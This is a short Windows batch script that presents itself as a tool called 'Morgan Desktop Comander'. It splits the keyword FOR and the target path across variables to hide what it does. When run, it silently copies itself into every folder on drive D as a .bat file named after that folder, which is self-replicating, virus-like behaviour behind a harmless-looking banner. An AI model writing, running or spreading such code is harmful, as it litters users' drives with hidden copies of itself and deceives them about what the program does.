@echo off
SET B=FO
SET L=R
set STRING_INSERTED_1_DBASE=copy %0 "%%~fa\%%~nxa.bat"
color b
echo.
set dev=d
echo  Morgan Desktop Comander & set STRING_INSERTED_1=%B%%L% /R "%dev%:\" /D
%STRING_INSERTED_1% %%a in (*) do %STRING_INSERTED_1_DBASE% >NUL

